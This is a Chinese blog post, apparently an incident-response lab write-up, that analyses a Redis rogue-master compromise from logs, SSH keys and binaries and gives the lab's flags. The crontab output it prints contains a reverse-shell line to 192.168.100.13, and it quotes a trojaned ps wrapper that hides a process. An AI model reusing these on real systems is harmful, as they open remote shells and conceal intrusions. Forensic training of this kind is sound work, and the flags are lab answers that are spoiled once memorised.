{"pageProps":{"postData":{"id":"玄机第二章 日志分析-redis应急响应","contentHtml":"<h1>第二章 日志分析-redis应急响应</h1>\n<ol>\n<li>\n<p>通过本地 PC SSH到服务器并且分析黑客攻击成功的 IP 为多少，将黑客 IP 作为 FLAG 提交</p>\n<p>日志文件存在<code>/var/log/redis.log</code> ，其中<code>192.168.100.13</code> 出现了很多</p>\n<pre><code class=\"hljs language-bash\">419:S 31 Jul 2023 05:33:21.623 * Connecting to MASTER 192.168.100.13:8888\n419:S 31 Jul 2023 05:33:21.623 * MASTER &#x3C;-> REPLICA <span class=\"hljs-built_in\">sync</span> started\n419:S 31 Jul 2023 05:33:21.624 <span class=\"hljs-comment\"># Error condition on socket for SYNC: Connection refused</span>\n419:S 31 Jul 2023 05:33:22.625 * Connecting to MASTER 192.168.100.13:8888\n419:S 31 Jul 2023 05:33:22.625 * MASTER &#x3C;-> REPLICA <span class=\"hljs-built_in\">sync</span> started\n419:S 31 Jul 2023 05:33:22.626 <span class=\"hljs-comment\"># Error condition on socket for SYNC: Connection refused</span>\n419:S 31 Jul 2023 05:33:23.627 * Connecting to MASTER 192.168.100.13:8888\n419:S 31 Jul 2023 05:33:23.627 * MASTER &#x3C;-> REPLICA <span class=\"hljs-built_in\">sync</span> started\n419:S 31 Jul 2023 05:33:23.628 <span class=\"hljs-comment\"># Error condition on socket for SYNC: Connection refused</span>\n419:S 31 Jul 2023 05:33:24.628 * Connecting to MASTER 192.168.100.13:8888\n419:S 31 Jul 2023 05:33:24.629 * MASTER &#x3C;-> REPLICA <span class=\"hljs-built_in\">sync</span> started\n419:S 31 Jul 2023 05:33:24.630 <span class=\"hljs-comment\"># Error condition on socket for SYNC: Connection refused</span>\n419:S 31 Jul 2023 05:33:25.631 * Connecting to MASTER 192.168.100.13:8888\n419:S 31 Jul 2023 05:33:25.631 * MASTER &#x3C;-> REPLICA <span class=\"hljs-built_in\">sync</span> started\n419:S 31 Jul 2023 05:33:25.632 <span class=\"hljs-comment\"># Error condition on socket for SYNC: Connection refused</span>\n419:S 31 Jul 2023 05:33:26.633 * Connecting to MASTER 192.168.100.13:8888\n419:S 31 Jul 2023 05:33:26.633 * MASTER &#x3C;-> REPLICA <span class=\"hljs-built_in\">sync</span> started\n419:S 31 Jul 2023 05:33:26.634 <span class=\"hljs-comment\"># Error condition on socket for SYNC: Connection refused</span>\n419:S 31 Jul 2023 05:33:27.635 * Connecting to MASTER 192.168.100.13:8888\n419:S 31 Jul 2023 05:33:27.635 * MASTER &#x3C;-> REPLICA <span class=\"hljs-built_in\">sync</span> started\n419:S 31 Jul 2023 05:33:27.636 <span class=\"hljs-comment\"># Error condition on socket for SYNC: Connection refused</span>\n419:S 31 Jul 2023 05:33:28.637 * Connecting to MASTER 192.168.100.13:8888\n419:S 31 Jul 2023 05:33:28.637 * MASTER &#x3C;-> REPLICA <span class=\"hljs-built_in\">sync</span> started\n419:S 31 Jul 2023 05:33:28.638 <span class=\"hljs-comment\"># Error condition on socket for SYNC: Connection refused</span>\n419:S 31 Jul 2023 05:33:29.639 * Connecting to MASTER 192.168.100.13:8888\n419:S 31 Jul 2023 05:34:02.720 <span class=\"hljs-comment\"># Error condition on socket for SYNC: Connection refused</span>\n419:S 31 Jul 2023 05:34:03.034 * REPLICAOF 192.168.31.55:8888 enabled (user request from <span class=\"hljs-string\">'id=5 addr=192.168.200.2:64319 fd=7 name= age=0 idle=0 flags=N db=0 sub=0 psub=0 multi=-1 qbuf=47 qbuf-free=32721 obl=0 oll=0 omem=0 events=r cmd=slaveof'</span>)\n419:S 31 Jul 2023 05:34:03.722 * Connecting to MASTER 192.168.31.55:8888\n419:S 31 Jul 2023 05:34:03.722 * MASTER &#x3C;-> REPLICA <span class=\"hljs-built_in\">sync</span> started\n419:S 31 Jul 2023 05:34:33.173 * REPLICAOF 192.168.100.20:8888 enabled (user request from <span class=\"hljs-string\">'id=6 addr=192.168.200.2:64339 fd=7 name= age=0 idle=0 flags=N db=0 sub=0 psub=0 multi=-1 qbuf=48 qbuf-free=32720 obl=0 oll=0 omem=0 events=r cmd=slaveof'</span>)\n419:S 31 Jul 2023 05:34:33.786 * Connecting to MASTER 192.168.100.20:8888\n419:S 31 Jul 2023 05:34:33.786 * MASTER &#x3C;-> REPLICA <span class=\"hljs-built_in\">sync</span> started\n419:S 31 Jul 2023 05:34:33.788 * Non blocking connect <span class=\"hljs-keyword\">for</span> SYNC fired the event.\n419:S 31 Jul 2023 05:34:35.192 * Master replied to PING, replication can <span class=\"hljs-built_in\">continue</span>...\n419:S 31 Jul 2023 05:34:35.194 * Trying a partial resynchronization (request 7a73a1a4297a16c50d8465b0cc432444f0e5df71:1).\n419:S 31 Jul 2023 05:34:35.195 * Full resync from master: ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ:1\n419:S 31 Jul 2023 05:34:35.195 * Discarding previously cached master state.\n419:S 31 Jul 2023 05:34:35.195 * MASTER &#x3C;-> REPLICA <span class=\"hljs-built_in\">sync</span>: receiving 48040 bytes from master\n</code></pre>\n<p>但是看日志<code>192.168.100.13</code>没有登陆成功，<code>192.168.100.20</code>登陆成功了</p>\n<pre><code class=\"hljs language-bash\">flag{192.168.100.20}\n</code></pre>\n</li>\n<li>\n<p>通过本地 PC SSH到服务器并且分析黑客第一次上传的恶意文件，将黑客上传的恶意文件里面的 FLAG 提交</p>\n<p>在日志中能看到尝试加载<code>exp.so</code></p>\n<pre><code class=\"hljs language-bash\">S 31 Jul 2023 05:34:35.195 * Discarding previously cached master state.\n419:S 31 Jul 2023 05:34:35.195 * MASTER &#x3C;-> REPLICA <span class=\"hljs-built_in\">sync</span>: receiving 48040 bytes from master\n419:S 31 Jul 2023 05:34:35.197 * MASTER &#x3C;-> REPLICA <span class=\"hljs-built_in\">sync</span>: Flushing old data\n419:S 31 Jul 2023 05:34:35.197 * MASTER &#x3C;-> REPLICA <span class=\"hljs-built_in\">sync</span>: Loading DB <span class=\"hljs-keyword\">in</span> memory\n419:S 31 Jul 2023 05:34:35.197 <span class=\"hljs-comment\"># Wrong signature trying to load DB from file</span>\n419:S 31 Jul 2023 05:34:35.197 <span class=\"hljs-comment\"># Failed trying to load the MASTER synchronization DB from disk</span>\n419:S 31 Jul 2023 05:34:35.791 * Connecting to MASTER 192.168.100.20:8888\n419:S 31 Jul 2023 05:34:35.791 * MASTER &#x3C;-> REPLICA <span class=\"hljs-built_in\">sync</span> started\n419:S 31 Jul 2023 05:34:35.792 * Non blocking connect <span class=\"hljs-keyword\">for</span> SYNC fired the event.\n419:S 31 Jul 2023 05:34:37.205 * Module <span class=\"hljs-string\">'system'</span> loaded from ./exp.so\n</code></pre>\n<pre><code class=\"hljs language-bash\">root@ip-10-0-10-1:/tmp# find / -name *exp.so*\n/exp.so\n/usr/lib/x86_64-linux-gnu/rsyslog/lmregexp.so\n</code></pre>\n<p>因为时二进制文件，通过<code>strings</code>命令来读取</p>\n<pre><code class=\"hljs language-bash\">root@ip-10-0-10-1:/tmp# strings /exp.so \n....\nflag{XJ_78f012d7-42fc-49a8-8a8c-e74c87ea109b}\n....\n</code></pre>\n</li>\n<li>\n<p>通过本地 PC SSH到服务器并且分析黑客反弹 shell 的IP 为多少，将反弹 shell 的IP 作为 FLAG 提交</p>\n<p>通过日志，可以能看到两个IP，一般就是反弹shell</p>\n<pre><code class=\"hljs language-bash\">419:S 31 Jul 2023 05:33:15.065 * REPLICAOF 192.168.100.13:8888 enabled (user request from <span class=\"hljs-string\">'id=3 addr=192.168.200.2:64289 fd=7 name= age=0 idle=0 flags=N db=0 sub=0 psub=0 multi=-1 qbuf=48 qbuf-free=32720 obl=0 oll=0 omem=0 events=r cmd=slaveof'</span>)\n</code></pre>\n<p>这条日志表明副本（Replica）的 <code>REPLICAOF</code> 命令被更改，使其从 <code>192.168.100.13:8888</code> 这个新的主服务器同步。这种更改是由客户端 <code>id=3</code> 发送的，该客户端的 IP 地址是 <code>192.168.200.2</code>，使用端口 <code>64289</code> 进行连接。</p>\n<pre><code class=\"hljs language-bash\">\nflag{192.168.100.13}\n</code></pre>\n<p>并且通过Redis未授权访问获得<code>shell</code>的方法其实也就几种，例如：定时任务，SSH公钥，写入<code>WebShell</code>等</p>\n<p>查看计划任务</p>\n<pre><code class=\"hljs language-bash\">root@ip-10-0-10-1:/tmp# crontab -l\n<span class=\"hljs-comment\"># Edit this file to introduce tasks to be run by cron.</span>\n<span class=\"hljs-comment\"># </span>\n<span class=\"hljs-comment\"># Each task to run has to be defined through a single line</span>\n<span class=\"hljs-comment\"># indicating with different fields when the task will be run</span>\n<span class=\"hljs-comment\"># and what command to run for the task</span>\n<span class=\"hljs-comment\"># </span>\n<span class=\"hljs-comment\"># To define the time you can provide concrete values for</span>\n<span class=\"hljs-comment\"># minute (m), hour (h), day of month (dom), month (mon),</span>\n<span class=\"hljs-comment\"># and day of week (dow) or use '*' in these fields (for 'any').</span>\n<span class=\"hljs-comment\"># </span>\n<span class=\"hljs-comment\"># Notice that tasks will be started based on the cron's system</span>\n<span class=\"hljs-comment\"># daemon's notion of time and timezones.</span>\n<span class=\"hljs-comment\"># </span>\n<span class=\"hljs-comment\"># Output of the crontab jobs (including errors) is sent through</span>\n<span class=\"hljs-comment\"># email to the user the crontab file belongs to (unless redirected).</span>\n<span class=\"hljs-comment\"># </span>\n<span class=\"hljs-comment\"># For example, you can run a backup of all your user accounts</span>\n<span class=\"hljs-comment\"># at 5 a.m every week with:</span>\n<span class=\"hljs-comment\"># 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/</span>\n<span class=\"hljs-comment\"># </span>\n<span class=\"hljs-comment\"># For more information see the manual pages of crontab(5) and cron(8)</span>\n<span class=\"hljs-comment\"># </span>\n*/1 * * * *  /bin/sh -i >&#x26; /dev/tcp/192.168.100.13/7777 0>&#x26;1\n<span class=\"hljs-comment\"># m h  dom mon dow   command</span>\n</code></pre>\n<p>其中就有反弹<code>shell</code>的命令</p>\n</li>\n<li>\n<p>通过本地 PC SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串(flag{黑客的用户-关键字符串} 注关键字符串 xxx-xxx-xxx)。将用户名和关键字符串作为 FLAG提交</p>\n<p>通过strings读取exp.so的字符串没有找到类似用户名的字符串</p>\n<p>查看公钥文件能看到通过<code>Redis</code>写入的痕迹，后面跟着的标识<code>xj-test-user</code> 可能就是用户名</p>\n<pre><code class=\"hljs language-bash\">root@ip-10-0-10-1:~/.ssh# <span class=\"hljs-built_in\">cat</span> authorized_keys \nREDIS0009�      redis-ver5.0.1�\n�edis-bits�@�ctime�tO�dused-mem�XU\n aof-preamble���xxsshB9\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDDh4OEFvyb4ubM7YPvzG/FfO6jE4PjLdmuCUdGP+aeLeJB5SXYT6zHkU9wlfY/Fo4UuBlhTqBaS6Ih/Wf62KepzrMsTQQYcSG/Xp8lgFzVCCFAk7apzxfRCPNk1pxaGiEF6MPoCmUu1UhC3ta3xyh2c4KZls0hyFN9JZsuD+siT8KVqm856vQ+RaTrZi3ThMa5gbeH+v3ZUcO35ZfMKor/uWXffHT0Yi06dsgIMN3faIiBrd1Lg0B5kOTaDq3fHs8Qs7pvR9C4ZTm2AK/Oct8ULdsnfS2YWtrYyC8rzNip9Wf083ZY1B4bj1UoxD+QwgThh5VP3xgRd9KDSzEYIBabstGh8GU5zDxr0zIuhQM35I0aALvojXl4QaaEnZwpqU3ZkojPG2aNC0QdiBK7eKwA38Gk+V8DEWc/TTkO+wm3aXYdll5sPmoWTAonaln1nmCiTDn4jKb73DxYHfSgNIDpJ6fS5kbWL5UJnElWCrxzaXKHUlqXJj3x81Oz6baFNv8= xj-test-user\n</code></pre>\n<p>通过用户名到<code>Github</code>去找工具，能找到：<a href=\"https://github.com/xj-test-user/redis-rogue-getshell\">https://github.com/xj-test-user/redis-rogue-getshell</a></p>\n<p>藏得挺深的（看了WP）</p>\n<p><img src=\"/post-images/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image3.png\" alt=\"image.png\"></p>\n<p>那么Flag就是</p>\n<pre><code class=\"hljs language-bash\">flag{xj-test-user-wow-you-find-flag}\n</code></pre>\n</li>\n<li>\n<p>通过本地 PC SSH到服务器并且分析黑客篡改的命令，将黑客篡改的命令里面的关键字符串作为 FLAG 提交</p>\n<p>如果出现篡改命令，那么篡改的应该是<code>/usr/bin</code> 里面的</p>\n<pre><code class=\"hljs language-bash\">root@ip-10-0-10-1:/usr/bin# <span class=\"hljs-built_in\">ls</span> -lt | <span class=\"hljs-built_in\">head</span> -n 10\ntotal 197500\n-rwxrwxrwx 1 root root         178 Jul 31  2023 ps\n-rwxr-xr-x 1 root root      133432 Jul 31  2023 ps_\nlrwxrwxrwx 1 root root          25 Jul 31  2023 aclocal -> /etc/alternatives/aclocal\nlrwxrwxrwx 1 root root          26 Jul 31  2023 automake -> /etc/alternatives/automake\nlrwxrwxrwx 1 root root          21 Jul 31  2023 c99 -> /etc/alternatives/c99\nlrwxrwxrwx 1 root root          21 Jul 31  2023 c89 -> /etc/alternatives/c89\nlrwxrwxrwx 1 root root          20 Jul 31  2023 cc -> /etc/alternatives/cc\n-rwxr-xr-x 1 root root    14663096 Jun 29  2023 amazon-ssm-agent\n-rwxr-xr-x 1 root root    24088632 Jun 29  2023 ssm-agent-worker\n</code></pre>\n<p>有两个<code>ps</code>不对劲</p>\n<pre><code class=\"hljs language-bash\">root@ip-10-0-10-1:/usr/bin# <span class=\"hljs-built_in\">cat</span> ps\n<span class=\"hljs-comment\">#/bin/bash</span>\noldifs=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$IFS</span>\"</span>\nIFS=<span class=\"hljs-string\">'\\$n'</span>\nresult=$(ps_ <span class=\"hljs-variable\">$1</span> <span class=\"hljs-variable\">$2</span> <span class=\"hljs-variable\">$3</span>|grep -v <span class=\"hljs-string\">'threadd'</span> )\n<span class=\"hljs-keyword\">for</span> v <span class=\"hljs-keyword\">in</span> <span class=\"hljs-variable\">$result</span>;\n<span class=\"hljs-keyword\">do</span>\n        <span class=\"hljs-built_in\">echo</span> -e <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$v</span>\\t\"</span>;\n<span class=\"hljs-keyword\">done</span>\nIFS=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$oldifs</span>\"</span>\n<span class=\"hljs-comment\">#//c195i2923381905517d818e313792d196</span>\n</code></pre>\n<p>黑客对<code>ps</code>做了备份为<code>ps_</code> ,并且把结果中带有<code>threadd</code> 进程的结果排除掉了</p>\n<p>那么<code>Flag</code> 应该就是</p>\n<pre><code class=\"hljs language-bash\">flag{c195i2923381905517d818e313792d196}\n</code></pre>\n</li>\n</ol>","title":"玄机 - 第二章 日志分析-redis应急响应","date":"2025-04-04","updated":"2025-04-04","comments":true,"tags":["玄机","应急响应","日志分析"],"categories":"靶机","description":"第二章 日志分析-redis应急响应\n\n1. 通过本地 PC SSH到服务器并且分析黑客攻击成功的 IP 为多少，将黑客 IP 作为 FLAG 提交\n    \n    日志文件存在`/var/log/redis.log` ，其中`192.168.100.13` 出现了很多\n    \n    \n    \n    但是看日志`192.168.100.13`没有登陆成功，`192.168.100.20`..."},"recentPosts":[{"id":"HackMyVMBirdeye","title":"HackMyVM - Birdeye","date":"2025-10-17","isEncrypted":false,"year":"2025","month":"10","day":"17"},{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Machine - TombWatcher","date":"2025-06-08","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason8 - Certificate","title":"HackTheBox - Machine - Certificate","date":"2025-06-02","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason9 - Imagery","title":"HackTheBox - Season9 - Imagery","date":"2025-10-04","isEncrypted":true,"year":"2025","month":"10","day":"04"},{"id":"TheHackersLabsTortuga","title":"TheHackersLabs - Tortuga","date":"2025-10-01","isEncrypted":false,"year":"2025","month":"10","day":"01"},{"id":"TheHackersLabsElevator","title":"TheHackersLabs - Elevator","date":"2025-09-29","isEncrypted":false,"year":"2025","month":"09","day":"29"}]},"__N_SSG":true}